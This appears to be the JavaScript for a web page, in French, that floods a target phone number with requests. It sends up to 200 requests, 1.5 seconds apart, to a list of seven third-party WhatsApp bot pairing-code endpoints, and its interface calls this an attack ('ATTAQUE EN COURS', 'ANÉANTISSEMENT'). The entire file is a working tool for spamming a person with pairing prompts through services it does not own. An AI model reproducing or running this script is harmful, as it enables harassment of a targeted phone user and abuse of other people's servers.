const btn = document.getElementById('action-btn');
const numberInput = document.getElementById('target-number');
const countInput = document.getElementById('request-count');
const statusText = document.getElementById('status-text');

const API_URLS = [
    "https://qr-pair-anyav2.koyeb.app/code?number=",
    "https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=",
    "https://meg-lodon-session.up.railway.app/pair/code?number=",
    "https://hunter-xmd-pair2.onrender.com/code?number=",
    "https://hans-xmd-pair-v3.onrender.com/code?number=",
    "https://bwm-xmd-scanner-vv2.onrender.com/code?number=",
    "https://meg-lodon-session.onrender.com/code?number="
];

async function launchAttack() {
    let rawNumber = numberInput.value.trim();
    
    if (!rawNumber || rawNumber.length < 8 || /[a-zA-Z]/.test(rawNumber)) {
        statusText.innerText = "❌ ERREUR: Numéro invalide !";
        return;
    }

    let count = parseInt(countInput.value);
    if (isNaN(count) || count < 1) count = 1;
    if (count > 200) count = 200;

    btn.disabled = true;
    btn.innerText = "🔴 ATTAQUE EN COURS...";
    statusText.innerText = `⚡ ANÉANTISSEMENT EN COURS (0/${count})...`;

    let success = 0;
    let errors = 0;

    for (let i = 1; i <= count; i++) {
        const randomApi = API_URLS[Math.floor(Math.random() * API_URLS.length)];
        const url = randomApi + encodeURIComponent(rawNumber);
        
        try {
            const response = await fetch(url);
            if (response.ok) {
                success++;
            } else {
                errors++;
            }
        } catch (err) {
            errors++;
        }
        
        statusText.innerText = `⚡ ANÉANTISSEMENT EN COURS (${i}/${count})...`;
        
        if (i < count) await new Promise(r => setTimeout(r, 1500));
    }

    let finalMsg = `✅ TERMINÉ ! ${success} demandes réussies, ${errors} erreurs.`;
    if (success === 0) {
        finalMsg = `❌ ÉCHEC TOTAL ! Aucune demande n'a abouti. Vérifie le numéro ou les API.`;
    }
    
    statusText.innerText = finalMsg;
    btn.innerText = "LANCER L'ATTAQUE 🔥";
    btn.disabled = false;
      }
